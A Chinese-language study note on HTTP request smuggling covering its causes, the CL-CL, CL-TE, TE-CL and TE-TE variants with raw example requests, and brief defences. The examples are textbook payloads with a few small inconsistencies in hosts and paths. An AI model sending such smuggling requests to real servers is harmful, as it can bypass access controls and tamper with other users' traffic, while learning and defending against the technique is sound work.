## 概要

HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇文章中被提出。

## 成因

请求走私大多发生于==前端服务器==和==后端服务器==对客户端传入的==数据理解不一致==的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即 `Content-Length` 和 `Transfer-Encoding` 标头。

## 分类

-   CL.TE：前端服务器使用 `Content-Length` 头，后端服务器使用 Transfer-Encoding 头
-   TE.CL：前端服务器使用 `Transfer-Encoding` 标头，后端服务器使用 Content-Length 标头。
-   TE.TE：前端和后端服务器都支持 `Transfer-Encoding` 标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理

## 攻击

### 走私攻击实现

当向代理服务器发送一个比较模糊的 HTTP 请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个 HTTP 请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。

### 扩展：为什么会出现多次请求

在 `HTTP1.0` 之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。

在 `HTTP1.1` 中，增加了 `Keep-Alive` 和 `Pipeline` 这两个特性。

**Keep-Alive**：在HTTP请求中增加一个特殊的请求头 `Connection: Keep-Alive`，告诉服务器，接收完这次HTTP请求后，不要关闭 `TCP链接`，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 `HTTP1.1` 中默认开启的。  

**Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的`HTTP`请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。浏览器默认不启用`Pipeline`的，但是一般的服务器都提供了对`Pipleline`的支持。

### CL 不为 0 的 GET 请求

当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会==直接忽略==掉 GET 请求中的 `Content-Length` 头，不进行处理。例如下面这个例子：

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

前端服务器收到该请求，读取 `Content-Length`，判断这是一个完整的请求。
然后转发给后端服务器，后端服务器收到后，因为它不对 `Content-Length` 进行处理，由于 `Pipeline` 的存在，后端服务器就认为这是收到了两个请求，分别是：

第一个：

```
GET / HTTP/1.1\r\n
Host: test.com\r\n
```

第二个：

```
GET / secret HTTP/1.1\r\n
Host: test.com\r\n
```

所以造成了请求走私。

### CL-CL

根据 RFC 7230，当服务器收到的请求中包含两个 `Content-Length` ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 `Content-Length` 值时，就会出现漏洞。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```
中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。  
而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母 `a`，对于后端服务器来说，这个 `a` 是下一个请求的一部分，但是还没有传输完毕。


### CL-TE

CL-TE 指前端服务器处理 `Content-Length` 这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉 `Content-Length` ，处理 `Transfer-Encoding`。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
```

这个例子中a同样会被带入下一个请求，变为 aGET / HTTP/1.1\r\n 。

> **RFC2616规范**
> 如果接收的消息==同时包含==传输编码头字段(`Transfer-Encoding`)和内容长度头(`Content-Length`)字段，则必须==忽略后者==。

> [[chunked 编码]]


### TE-CL

TE-CL 指前端服务器处理 `Transfer-Encoding` 请求头，而后端服务器处理 `Content-Length` 请求头。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

前端服务器处理`Transfer-Encoding`，当其读取到

```
0\r\n
\r\n
```

认为是读取完毕了。  
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 `Content-Length` 请求头，因为请求体的长度为 `4`.也就是当它读取完

```
12\r\n
```

就认为这个请求已经结束了。后面的数据就认为是另一个请求：

```
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

成功报错，造成HTTP请求走私。


### TE-TE

TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理`Transfer-Encoding` 请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的 `Transfer-Encoding` 进行某种==混淆==操作(如某个字符改变大小写)，从而使其中一个服务器不处理 `Transfer-Encoding` 请求头。在某种意义上这还是 `CL-TE` 或者 `TE-CL`。

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

前端服务器处理 `Transfer-Encoding`，当其读取到

```
0\r\n
\r\n
```

认为是读取结束。  
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理 `Transfer-encoding` 请求头，将 `Transfer-Encoding` 隐藏在服务端的一个 `chain` 中时，它将会回退到使用 `Content-Length` 去发送请求。读取到

```
5c\r\n
```

认为是读取完毕了。后面的数据就认为是另一个请求：

```
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

成功报错，造成HTTP请求走私。

## 防御

-   禁用后端连接重用
-   确保连接中的所有服务器具有相同的配置
-   拒绝有二义性的请求

## 参考链接

[从一道题到协议层攻击之HTTP请求走私](https://xz.aliyun.com/t/6654)